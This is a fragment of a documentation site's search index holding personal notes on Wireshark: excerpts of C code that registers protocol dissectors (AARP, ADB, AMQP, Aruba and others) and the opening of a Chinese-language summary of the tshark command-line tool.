proto_register_protocol( \"Aruba Instant AP Protocol\" , \"aruba_iap\" , \"aruba_iap\" ); void proto_reg_handoff_aruba_iap ( void ) { dissector_handle_t iap_handle; iap_handle = create_dissector_handle(dissect_aruba_iap, proto_aruba_iap); dissector_add_uint( \"ethertype\" , ETHERTYPE_IAP, iap_handle); } papi \u00b6 proto_papi = proto_register_protocol( \"Aruba PAPI\" , \"PAPI\" , \"papi\" ); void proto_reg_handoff_papi ( void ) { dissector_handle_t papi_handle; papi_handle = create_dissector_handle(dissect_papi, proto_papi); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_PAPI, papi_handle); }","title":"protocol register"},{"location":"module/wireshark/protocol_register/#protocol-register","text":"","title":"protocol register"},{"location":"module/wireshark/protocol_register/#a21","text":"proto_a21 = proto_register_protocol( \"A21 Protocol\" , \"A21\" , \"a21\" ); void proto_reg_handoff_a21 ( void ) { dissector_handle_t a21_handle; a21_handle = create_dissector_handle(dissect_a21, proto_a21); gcsna_handle = find_dissector_add_dependency( \"gcsna\" , proto_a21); dissector_add_uint_with_preference( \"udp.port\" , A21_PORT, a21_handle); }","title":"a21"},{"location":"module/wireshark/protocol_register/#aarp","text":"proto_aarp = proto_register_protocol( \"Appletalk Address Resolution Protocol\" , \"AARP\" , \"aarp\" ); void proto_reg_handoff_aarp ( void ) { dissector_handle_t aarp_handle; aarp_handle = create_dissector_handle(dissect_aarp, proto_aarp); dissector_add_uint( \"ethertype\" , ETHERTYPE_AARP, aarp_handle); dissector_add_uint( \"chdlc.protocol\" , ETHERTYPE_AARP, aarp_handle); }","title":"aarp"},{"location":"module/wireshark/protocol_register/#aasp","text":"proto_aasp = proto_register_protocol( \"Aastra Signalling Protocol\" , \"AASP\" , \"aasp\" ); void proto_reg_handoff_aasp ( void ) { dissector_handle_t aasp_handle; aasp_handle = create_dissector_handle(dissect_aasp, proto_aasp); dissector_add_string( \"media_type\" , \"message/x-aasp-signalling\" , aasp_handle); }","title":"aasp"},{"location":"module/wireshark/protocol_register/#acap","text":"proto_acap = proto_register_protocol( \"Application Configuration Access Protocol\" , \"ACAP\" , \"acap\" ); void proto_reg_handoff_acap ( void ) { dissector_add_uint_with_preference( \"tcp.port\" , TCP_PORT_ACAP, acap_handle); }","title":"acap"},{"location":"module/wireshark/protocol_register/#acn","text":"test proto_acn = proto_register_protocol ( \"Architecture for Control Networks\" , /* name */ \"ACN\" , /* short name */ \"acn\" /* abbrev */ ); void proto_reg_handoff_acn ( void ) { /* dissector_handle_t acn_handle; */ /* acn_handle = create_dissector_handle(dissect_acn, proto_acn); */ /* dissector_add_for_decode_as_with_preference(\"udp.port\", acn_handle); */ heur_dissector_add( \"udp\" , dissect_acn_heur, \"ACN over UDP\" , \"acn_udp\" , proto_acn, HEURISTIC_DISABLE); }","title":"acn"},{"location":"module/wireshark/protocol_register/#acp133","text":"test #define PNAME \"ACP133 Attribute Syntaxes\" #define PSNAME \"ACP133\" #define PFNAME \"acp133\" ' ber.oid '","title":"acp133"},{"location":"module/wireshark/protocol_register/#acr122","text":"test","title":"acr122"},{"location":"module/wireshark/protocol_register/#acse","text":"test #define PNAME \"ISO 8650-1 OSI Association Control Service\" #define PSNAME \"ACSE\" #define PFNAME \"acse\" #define CLPNAME \"ISO 10035-1 OSI Connectionless Association Control Service\" #define CLPSNAME \"CLACSE\" #define CLPFNAME \"clacse\" ' ber.oid '","title":"acse"},{"location":"module/wireshark/protocol_register/#actrace","text":"/* Register protocol */ proto_actrace = proto_register_protocol( \"AudioCodes Trunk Trace\" , \"ACtrace\" , \"actrace\" ); /* The registration hand-off routine */ void proto_reg_handoff_actrace ( void ) { dissector_handle_t actrace_handle; /* Get a handle for the lapd dissector. */ lapd_handle = find_dissector_add_dependency( \"lapd\" , proto_actrace); actrace_handle = create_dissector_handle(dissect_actrace, proto_actrace); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_ACTRACE, actrace_handle); }","title":"actrace"},{"location":"module/wireshark/protocol_register/#adb_cs","text":"proto_adb_cs = proto_register_protocol( \"Android Debug Bridge Client-Server\" , \"ADB CS\" , \"adb_cs\" ); void proto_reg_handoff_adb_cs ( void ) { adb_service_handle = find_dissector_add_dependency( \"adb_service\" , proto_adb_cs); dissector_add_for_decode_as_with_preference( \"tcp.port\" , adb_cs_handle); }","title":"adb_cs"},{"location":"module/wireshark/protocol_register/#adb","text":"proto_adb = proto_register_protocol( \"Android Debug Bridge\" , \"ADB\" , \"adb\" ); void proto_reg_handoff_adb ( void ) { adb_service_handle = find_dissector_add_dependency( \"adb_service\" , proto_adb); dissector_add_for_decode_as_with_preference( \"tcp.port\" , adb_handle); dissector_add_for_decode_as( \"usb.device\" , adb_handle); dissector_add_for_decode_as( \"usb.product\" , adb_handle); dissector_add_for_decode_as( \"usb.protocol\" , adb_handle); proto_tcp = proto_get_id_by_filter_name( \"tcp\" ); proto_usb = proto_get_id_by_filter_name( \"usb\" ); }","title":"adb"},{"location":"module/wireshark/protocol_register/#adwin_config","text":"test proto_adwin_config = proto_register_protocol( \"ADwin configuration protocol\" , \"ADwin-Config\" , \"adwin_config\" ); /* Required function calls to register the header fields and subtrees used */ proto_register_field_array(proto_adwin_config, hf, array_length(hf)); proto_register_subtree_array(ett, array_length(ett)); } void proto_reg_handoff_adwin_config( void ) { heur_dissector_add( \"udp\" , dissect_adwin_config_udp, \"ADwin-Config over UDP\" , \"adwin_config_udp\" , proto_adwin_config, HEURISTIC_ENABLE); heur_dissector_add( \"tcp\" , dissect_adwin_config_tcp, \"ADwin-Config over TCP\" , \"adwin_config_tcp\" , proto_adwin_config, HEURISTIC_ENABLE); }","title":"adwin_config"},{"location":"module/wireshark/protocol_register/#adwin","text":"void proto_reg_handoff_adwin ( void ) { dissector_handle_t adwin_handle; adwin_handle = create_dissector_handle(dissect_adwin, proto_adwin); dissector_add_uint_with_preference( \"udp.port\" , ADWIN_COMM_PORT, adwin_handle); } proto_adwin = proto_register_protocol( \"ADwin communication protocol\" , \"ADwin\" , \"adwin\" );","title":"adwin"},{"location":"module/wireshark/protocol_register/#aeron","text":"proto_aeron = proto_register_protocol( \"Aeron Protocol\" , \"Aeron\" , \"aeron\" ); void proto_reg_handoff_aeron ( void ) { aeron_dissector_handle = create_dissector_handle(dissect_aeron, proto_aeron); dissector_add_for_decode_as_with_preference( \"udp.port\" , aeron_dissector_handle); heur_dissector_add( \"udp\" , test_aeron_packet, \"Aeron over UDP\" , \"aeron_udp\" , proto_aeron, HEURISTIC_DISABLE); }","title":"aeron"},{"location":"module/wireshark/protocol_register/#afp","text":"test proto_afp = proto_register_protocol( \"Apple Filing Protocol\" , \"AFP\" , \"afp\" ); void proto_reg_handoff_afp ( void ) { spotlight_handle = find_dissector_add_dependency( \"afp_spotlight\" , proto_afp); }","title":"afp"},{"location":"module/wireshark/protocol_register/#afs","text":"proto_afs = proto_register_protocol( \"Andrew File System (AFS)\" , \"AFS (RX)\" , \"afs\" );","title":"afs"},{"location":"module/wireshark/protocol_register/#agentx","text":"proto_agentx = proto_register_protocol( \"AgentX\" , \"AgentX\" , \"agentx\" ); void proto_reg_handoff_agentx ( void ) { dissector_handle_t agentx_handle; agentx_handle = create_dissector_handle(dissect_agentx, proto_agentx); dissector_add_uint_with_preference( \"tcp.port\" , AGENTX_TCP_PORT, agentx_handle); }","title":"agentx"},{"location":"module/wireshark/protocol_register/#aim","text":"proto_aim = proto_register_protocol( \"AOL Instant Messenger\" , \"AIM\" , \"aim\" ); dissector_add_uint_range_with_preference( \"tcp.port\" , TCP_PORTS_AIM_DEFAULT, aim_handle);","title":"aim"},{"location":"module/wireshark/protocol_register/#ain","text":"#define PNAME \"Advanced Intelligent Network\" #define PSNAME \"AIN\" #define PFNAME \"ain\"","title":"ain"},{"location":"module/wireshark/protocol_register/#ajp13","text":"proto_ajp13 = proto_register_protocol( \"Apache JServ Protocol v1.3\" , \"AJP13\" , \"ajp13\" ); void proto_reg_handoff_ajp13 ( void ) { dissector_handle_t ajp13_handle; ajp13_handle = create_dissector_handle(dissect_ajp13, proto_ajp13); dissector_add_uint_with_preference( \"tcp.port\" , AJP13_TCP_PORT, ajp13_handle); }","title":"ajp13"},{"location":"module/wireshark/protocol_register/#alcap","text":"alcap proto_alcap = proto_register_protocol(alcap_proto_name, alcap_proto_name_short, \"alcap\" ); void proto_reg_handoff_alcap ( void ) { dissector_add_uint( \"mtp3.service_indicator\" , MTP_SI_AAL2, alcap_handle); }","title":"alcap"},{"location":"module/wireshark/protocol_register/#alljoyn","text":"ajns aj ardp proto_AllJoyn_ns = proto_register_protocol( \"AllJoyn Name Service Protocol\" , \"AllJoyn NS\" , \"ajns\" ); /* Message protocols */ proto_AllJoyn_mess = proto_register_protocol( \"AllJoyn Message Protocol\" , \"AllJoyn\" , \"aj\" ); proto_register_field_array(proto_AllJoyn_ns, hf, array_length(hf)); proto_register_subtree_array(ett, array_length(ett)); expert_alljoyn = expert_register_protocol(proto_AllJoyn_mess); expert_register_field_array(expert_alljoyn, ei, array_length(ei)); /* ARDP */ /* name, short name, abbrev */ proto_AllJoyn_ardp = proto_register_protocol( \"AllJoyn Reliable Datagram Protocol\" , \"AllJoyn ARDP\" , \"ardp\" ); } void proto_reg_handoff_AllJoyn( void ) { dissector_handle_t alljoyn_handle_ns; dissector_handle_t alljoyn_handle_ardp; alljoyn_handle_ns = create_dissector_handle(dissect_AllJoyn_name_server, proto_AllJoyn_ns); alljoyn_handle_ardp = create_dissector_handle(dissect_AllJoyn_ardp, proto_AllJoyn_ardp); dissector_add_uint_with_preference( \"tcp.port\" , ALLJOYN_NAME_SERVER_PORT, alljoyn_handle_ns); dissector_add_uint_with_preference( \"tcp.port\" , ALLJOYN_MESSAGE_PORT, ); dissector_add_uint_with_preference( \"udp.port\" , ALLJOYN_NAME_SERVER_PORT, alljoyn_handle_ns); /* The ARDP dissector will directly call the AllJoyn message dissector if needed. * This includes the case where there is no ARDP data. */ dissector_add_uint_with_preference( \"udp.port\" , ALLJOYN_MESSAGE_PORT, alljoyn_handle_ardp); }","title":"AllJoyn"},{"location":"module/wireshark/protocol_register/#amp","text":"amp proto_amp = proto_register_protocol( \"AMP\" , \"AMP\" , \"amp\" ); void proto_reg_handoff_amp ( void ) { dissector_add_uint( \"ccsds.apid\" , AMP_APID, amp_handle); dissector_add_for_decode_as_with_preference( \"udp.port\" , amp_handle); } \"ccsds.apid\"","title":"amp"},{"location":"module/wireshark/protocol_register/#amqp","text":"proto_amqp = proto_register_protocol( \"Advanced Message Queueing Protocol\" , \"AMQP\" , \"amqp\" ); void proto_reg_handoff_amqp ( void ) { static guint old_amqps_port = 0 ; static gboolean initialize = FALSE; if ( ! initialize) { /* Register TCP port for dissection */ dissector_add_uint_with_preference( \"tcp.port\" , AMQP_PORT, amqp_tcp_handle); dissector_add_uint( \"amqp.version\" , AMQP_V0_9, create_dissector_handle( dissect_amqpv0_9, proto_amqpv0_9 )); dissector_add_uint( \"amqp.version\" , AMQP_V0_10, create_dissector_handle( dissect_amqpv0_10, proto_amqpv0_10 )); dissector_add_uint( \"amqp.version\" , AMQP_V1_0, create_dissector_handle( dissect_amqpv1_0, proto_amqpv1_0 )); initialize = TRUE; } /* Register for SSL/TLS payload dissection */ if (old_amqps_port != amqps_port) { if (old_amqps_port != 0 ) ssl_dissector_delete(old_amqps_port, amqp_tcp_handle); ssl_dissector_add(amqps_port, amqp_tcp_handle); old_amqps_port = amqps_port; } media_type_subdissector_table = find_dissector_table ( \"media_type\" ); } \"tcp.port\" \"tls.port\"","title":"amqp"},{"location":"module/wireshark/protocol_register/#amr","text":"amr proto_amr = proto_register_protocol( \"Adaptive Multi-Rate\" , \"AMR\" , \"amr\" ); \"rtp_dyn_payload_type\" \"h245.gef.name\"","title":"amr"},{"location":"module/wireshark/protocol_register/#amt","text":"proto_amt = proto_register_protocol( \"Automatic Multicast Tunneling\" , \"AMT\" , \"amt\" ); void proto_reg_handoff_amt ( void ) { dissector_handle_t amt_handle; ip_handle = find_dissector_add_dependency( \"ip\" , proto_amt); amt_handle = create_dissector_handle(dissect_amt, proto_amt); dissector_add_uint_with_preference( \"udp.port\" , AMT_UDP_PORT, amt_handle); }","title":"amt"},{"location":"module/wireshark/protocol_register/#ancp","text":"proto_ancp = proto_register_protocol ( \"Access Node Control Protocol\" , \"ANCP\" , \"ancp\" ); void proto_reg_handoff_ancp ( void ) { dissector_handle_t ancp_handle; ancp_handle = create_dissector_handle(dissect_ancp, proto_ancp); dissector_add_uint_with_preference( \"tcp.port\" , ANCP_PORT, ancp_handle); stats_tree_register( \"ancp\" , \"ancp\" , \"ANCP\" , 0 , ancp_stats_tree_packet, ancp_stats_tree_init, NULL); }","title":"ancp"},{"location":"module/wireshark/protocol_register/#ans","text":"proto_ans = proto_register_protocol( \"Intel ANS probe\" , \"ANS\" , \"ans\" ); void proto_reg_handoff_ans ( void ) { dissector_handle_t ans_handle; ans_handle = create_dissector_handle(dissect_ans, proto_ans); dissector_add_uint( \"ethertype\" , ETHERTYPE_INTEL_ANS, ans_handle); }","title":"ans"},{"location":"module/wireshark/protocol_register/#ansi_637","text":"ansi_637_trans ansi_637_tele proto_ansi_637_tele = proto_register_protocol(ansi_proto_name_tele, \"ANSI IS-637-A Teleservice\" , \"ansi_637_tele\" ); proto_ansi_637_trans = proto_register_protocol(ansi_proto_name_trans, \"ANSI IS-637-A Transport\" , \"ansi_637_trans\" ); ansi_637_trans_app_handle = create_dissector_handle(dissect_ansi_637_trans_app, proto_ansi_637_trans); dissector_add_string( \"media_type\" , \"application/vnd.3gpp2.sms\" , ansi_637_trans_app_handle);","title":"ansi_637"},{"location":"module/wireshark/protocol_register/#ansi_","text":"pass","title":"ansi_*"},{"location":"module/wireshark/protocol_register/#aodv","text":"proto_aodv = proto_register_protocol( \"Ad hoc On-demand Distance Vector Routing Protocol\" , \"AODV\" , \"aodv\" ); void proto_reg_handoff_aodv ( void ) { dissector_handle_t aodv_handle; aodv_handle = create_dissector_handle(dissect_aodv, proto_aodv); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_AODV, aodv_handle); }","title":"aodv"},{"location":"module/wireshark/protocol_register/#aoe","text":"proto_aoe = proto_register_protocol( \"ATAoverEthernet\" , \"AOE\" , \"aoe\" ); void proto_reg_handoff_aoe ( void ) { dissector_add_uint( \"ethertype\" , ETHERTYPE_AOE, aoe_handle); }","title":"aoe"},{"location":"module/wireshark/protocol_register/#aol","text":"proto_aol = proto_register_protocol( \"America Online\" , \"AOL\" , \"aol\" ); void proto_reg_handoff_aol ( void ) { dissector_handle_t aol_handle; aol_handle = create_dissector_handle(dissect_aol,proto_aol); dissector_add_uint_with_preference( \"tcp.port\" ,AOL_PORT,aol_handle); }","title":"aol"},{"location":"module/wireshark/protocol_register/#ap1394","text":"ap1394 proto_ap1394 = proto_register_protocol( \"Apple IP-over-IEEE 1394\" , \"IP/IEEE1394\" , \"ap1394\" ); void proto_reg_handoff_ap1394 ( void ) { dissector_handle_t ap1394_handle; capture_dissector_handle_t ap1394_cap_handle; ethertype_subdissector_table = find_dissector_table( \"ethertype\" ); ap1394_handle = create_dissector_handle(dissect_ap1394, proto_ap1394); dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_APPLE_IP_OVER_IEEE1394, ap1394_handle); ap1394_cap_handle = create_capture_dissector_handle(capture_ap1394, proto_ap1394); capture_dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_APPLE_IP_OVER_IEEE1394, ap1394_cap_handle); } \"wtap_encap\"","title":"ap1394"},{"location":"module/wireshark/protocol_register/#app-pkix-cert","text":"proto_cert = proto_register_protocol( \"PKIX CERT File Format\" , \"PKIX Certificate\" , \"pkix-cert\" ); void proto_reg_handoff_cert ( void ) { dissector_handle_t cert_handle; cert_handle = create_dissector_handle(dissect_cert, proto_cert); /* Register the PKIX-CERT media type */ dissector_add_string( \"media_type\" , \"application/pkix-cert\" , cert_handle); }","title":"app-pkix-cert"},{"location":"module/wireshark/protocol_register/#applemidi","text":"applemidi #define APPLEMIDI_DISSECTOR_NAME \"Apple Network-MIDI Session Protocol\" #define APPLEMIDI_DISSECTOR_SHORTNAME \"AppleMIDI\" #define APPLEMIDI_DISSECTOR_ABBREVIATION \"applemidi\" void proto_reg_handoff_applemidi ( void ) { applemidi_handle = create_dissector_handle( dissect_applemidi, proto_applemidi ); rtp_handle = find_dissector_add_dependency( \"rtp\" , proto_applemidi ); heur_dissector_add( \"udp\" , dissect_applemidi_heur, \"Apple MIDI over UDP\" , \"applemidi_udp\" , proto_applemidi, HEURISTIC_ENABLE ); }","title":"applemidi"},{"location":"module/wireshark/protocol_register/#aprs","text":"proto_aprs = proto_register_protocol( \"Automatic Position Reporting System\" , \"APRS\" , \"aprs\" );","title":"aprs"},{"location":"module/wireshark/protocol_register/#ar_drone","text":"proto_ar_drone = proto_register_protocol( \"AR Drone Packet\" , \"AR Drone\" , \"ar_drone\" ); void proto_reg_handoff_ar_drone ( void ) { dissector_handle_t ar_drone_handle; ar_drone_handle = create_dissector_handle(dissect_ar_drone, proto_ar_drone); heur_dissector_add( \"udp\" , dissect_ar_drone, \"AR Drone over UDP\" , \"ar_drone_udp\" , proto_ar_drone, HEURISTIC_ENABLE); dissector_add_for_decode_as_with_preference( \"udp.port\" , ar_drone_handle); }","title":"ar_drone"},{"location":"module/wireshark/protocol_register/#arcnet","text":"arcent proto_arcnet = proto_register_protocol ( \"ARCNET\" , \"ARCNET\" , \"arcnet\" ); void proto_reg_handoff_arcnet ( void ) { dissector_handle_t arcnet_handle, arcnet_linux_handle; capture_dissector_handle_t arcnet_cap_handle; arcnet_handle = create_dissector_handle (dissect_arcnet, proto_arcnet); dissector_add_uint ( \"wtap_encap\" , WTAP_ENCAP_ARCNET, arcnet_handle); arcnet_linux_handle = create_dissector_handle (dissect_arcnet_linux, proto_arcnet); dissector_add_uint ( \"wtap_encap\" , WTAP_ENCAP_ARCNET_LINUX, arcnet_linux_handle); proto_ipx = proto_get_id_by_filter_name( \"ipx\" ); arcnet_cap_handle = create_capture_dissector_handle(capture_arcnet, proto_arcnet); capture_dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_ARCNET_LINUX, arcnet_cap_handle); arcnet_cap_handle = create_capture_dissector_handle(capture_arcnet_has_exception, proto_arcnet); capture_dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_ARCNET, arcnet_cap_handle); ip_cap_handle = find_capture_dissector( \"ip\" ); arp_cap_handle = find_capture_dissector( \"arp\" ); } \"wtap_encap\"","title":"arcnet"},{"location":"module/wireshark/protocol_register/#armagetronad","text":"proto_armagetronad = proto_register_protocol( \"The Armagetron Advanced OpenGL Tron clone\" , \"Armagetronad\" , \"armagetronad\" ); void proto_reg_handoff_armagetronad ( void ) { dissector_add_uint_range_with_preference( \"udp.port\" , ARMAGETRONAD_UDP_PORT_RANGE, armagetronad_handle); }","title":"armagetronad"},{"location":"module/wireshark/protocol_register/#arp","text":"arp proto_arp = proto_register_protocol( \"Address Resolution Protocol\" , \"ARP/RARP\" , \"arp\" );","title":"arp"},{"location":"module/wireshark/protocol_register/#artemis","text":"proto_artemis = proto_register_protocol ( \"Artemis Core Protocol\" , \"Artemis\" , \"artemis\" ); void proto_reg_handoff_artemis ( void ) { static gboolean initialize = FALSE; if ( ! initialize) { /* Register TCP port for dissection */ dissector_add_uint_with_preference( \"tcp.port\" , ARTEMIS_PORT, artemis_tcp_handle); initialize = TRUE; } }","title":"artemis"},{"location":"module/wireshark/protocol_register/#artnet","text":"artnet proto_artnet = proto_register_protocol( \"Art-Net\" , \"ARTNET\" , \"artnet\" ); proto_register_field_array(proto_artnet, hf, array_length(hf)); proto_register_subtree_array(ett, array_length(ett)); } void proto_reg_handoff_artnet( void ) { dissector_handle_t artnet_handle; artnet_handle = create_dissector_handle(dissect_artnet, proto_artnet); dissector_add_for_decode_as_with_preference( \"udp.port\" , artnet_handle); rdm_handle = find_dissector_add_dependency( \"rdm\" , proto_artnet); dmx_chan_handle = find_dissector_add_dependency( \"dmx-chan\" , proto_artnet); heur_dissector_add( \"udp\" , dissect_artnet_heur, \"ARTNET over UDP\" , \"artnet_udp\" , proto_artnet, HEURISTIC_ENABLE); }","title":"artnet"},{"location":"module/wireshark/protocol_register/#aruba-adp","text":"proto_aruba_adp = proto_register_protocol( \"Aruba Discovery Protocol\" , \"ADP\" , \"adp\" ); void proto_reg_handoff_aruba_adp ( void ) { dissector_handle_t adp_handle; adp_handle = create_dissector_handle(dissect_aruba_adp, proto_aruba_adp); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_ADP, adp_handle); }","title":"aruba-adp"},{"location":"module/wireshark/protocol_register/#aruba_erm","text":"proto_aruba_erm = proto_register_protocol(PROTO_LONG_NAME, \"ARUBA_ERM\" , \"aruba_erm\" ); \"udp.port\" ?","title":"aruba_erm"},{"location":"module/wireshark/protocol_register/#aruba_iap","text":"proto_aruba_iap = proto_register_protocol( \"Aruba Instant AP Protocol\" , \"aruba_iap\" , \"aruba_iap\" ); void proto_reg_handoff_aruba_iap ( void ) { dissector_handle_t iap_handle; iap_handle = create_dissector_handle(dissect_aruba_iap, proto_aruba_iap); dissector_add_uint( \"ethertype\" , ETHERTYPE_IAP, iap_handle); }","title":"aruba_iap"},{"location":"module/wireshark/protocol_register/#papi","text":"proto_papi = proto_register_protocol( \"Aruba PAPI\" , \"PAPI\" , \"papi\" ); void proto_reg_handoff_papi ( void ) { dissector_handle_t papi_handle; papi_handle = create_dissector_handle(dissect_papi, proto_papi); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_PAPI, papi_handle); }","title":"papi"},{"location":"module/wireshark/tshark/","text":"tshark \u00b6 tshark - \u8f6c\u50a8\uff0c\u5206\u6790\u7f51\u7edc\u6d41\u91cf https://www.wireshark.org/docs/man-pages/tshark.html tshark [ -i <capture interface> | - ] [ -f <capture filter> ] [ -2 ] [ -r <infile> ] [ -w <outfile> | - ] [ options ] [ <filter> ] tshark -G [ <report type> ] [ --elastic-mapping-filter <protocols> ] \u63cf\u8ff0 \u00b6 Tshrak \u662f\u4e00\u4e2a\u7f51\u7edc\u534f\u8bae\u5206\u6790\u5de5\u5177\uff0c\u53ef\u4ee5\u4ece\u5b9e\u65f6\u7f51\u7edc\u6355\u83b7\u6570\u636e\u5305\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u4ece\u5148\u524d\u4fdd\u5b58\u7684\u6355\u83b7\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u5305\uff0c\u8fdb\u800c\u5c06\u8fd9\u4e9b\u5305\u7684\u89e3\u7801\u5f62\u5f0f\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u6216\u8005\u5c06\u8fd9\u4e9b\u5305\u5199\u5165\u6587\u4ef6\u3002 \u6355\u83b7\u6587\u4ef6\u7684\u9ed8\u8ba4\u683c\u5f0f\u662fpcapng \u9009\u9879 \u00b6 -2 \u00b6 Perform a two-pass analysis. This causes tshark to buffer output until the entire first pass is done, but allows it to fill in fields that require future knowledge, such as 'response in frame #' fields. Also permits reassembly frame dependencies to be calculated correctly.","title":"wireshark"},{"location":"module/wireshark/tshark/#tshark","text":"tshark - \u8f6c\u50a8\uff0c\u5206\u6790\u7f51\u7edc\u6d41\u91cf https://www.wireshark.org/docs/man-pages/tshark.html tshark [ -i <capture interface> | - ] [ -f <capture filter> ] [ -2 ] [ -r <infile> ] [ -w <outfile> | - ] [ options ] [ <filter> ] tshark -G [ <report type> ] [ --elastic-mapping-filter <protocols> ]","title":"tshark"},{"location":"module/wireshark/tshark/#_1","text":"Tshrak \u662f\u4e00\u4e2a\u7f51\u7edc\u534f\u8bae\u5206\u6790\u5de5\u5177\uff0c\u53ef\u4ee5\u4ece\u5b9e\u65f6\u7f51\u7edc\u6355\u83b7\u6570\u636e\u5305\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u4ece\u5148\u524d\u4fdd\u5b58\u7684\u6355\u83b7\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u5305\uff0c\u8fdb\u800c\u5c06\u8fd9\u4e9b\u5305\u7684\u89e3\u7801\u5f62\u5f0f\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u6216\u8005\u5c06\u8fd9\u4e9b\u5305\u5199\u5165\u6587\u4ef6\u3002 \u6355\u83b7\u6587\u4ef6\u7684\u9ed8\u8ba4\u683c\u5f0f\u662fpcapng","title":"\u63cf\u8ff0"},{"location":"module/wireshark/tshark/#_2","text":"","title":"\u9009\u9879"},{"location":"module/wireshark/tshark/#-2","text":"Perform a two-pass analysis. This causes tshark to buffer output until the entire first pass is done, but allows it to fill in fields that require future knowledge, such as 'response in frame #' fields. Also permits reassembly frame dependencies to be calculated correctly.","title":"-2"}]}